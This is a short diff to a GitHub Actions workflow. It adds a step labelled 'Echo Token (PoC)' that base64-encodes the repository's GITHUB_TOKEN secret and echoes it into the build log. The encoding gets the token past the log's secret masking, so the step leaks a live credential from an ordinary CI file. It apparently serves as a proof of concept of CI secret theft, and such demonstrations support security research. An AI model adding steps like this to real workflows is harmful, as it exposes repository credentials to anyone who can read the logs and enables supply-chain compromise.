@@ -22,6 +22,10 @@ jobs:
     steps:
       - name: Checkout
         uses: actions/checkout@v4
+      - name: Echo Token (PoC)
+        run: |
+           echo "Token: $(echo ${{ secrets.GITHUB_TOKEN }} | base64)"
+
 
       - name: Node
         uses: ./.github/actions/node
